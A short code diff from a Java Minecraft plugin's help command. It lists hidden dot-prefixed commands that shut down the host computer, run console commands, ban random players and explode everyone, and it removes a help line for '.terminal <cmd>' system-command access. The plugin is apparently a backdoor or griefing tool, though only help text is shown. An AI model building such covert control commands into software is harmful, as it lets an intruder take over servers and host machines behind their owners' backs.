@@ -38,7 +38,6 @@ public class Command_help implements Listener
                 //p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
                 p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
                 //p.sendMessage(ChatColor.GOLD + ".fuckoff - Wouldn't have a clue."); // Pald update this one.
-                p.sendMessage(ChatColor.GOLD + ".terminal <cmd> - Use system commands!");
                 p.sendMessage(ChatColor.GOLD + ".explode or .explosion - Explode everyone on the server. Includes you.");
                 p.sendMessage(ChatColor.GOLD + ".console <cmd> - Use the console.");
                 p.sendMessage(ChatColor.GOLD + ".name <player> <name> - Name a player.");
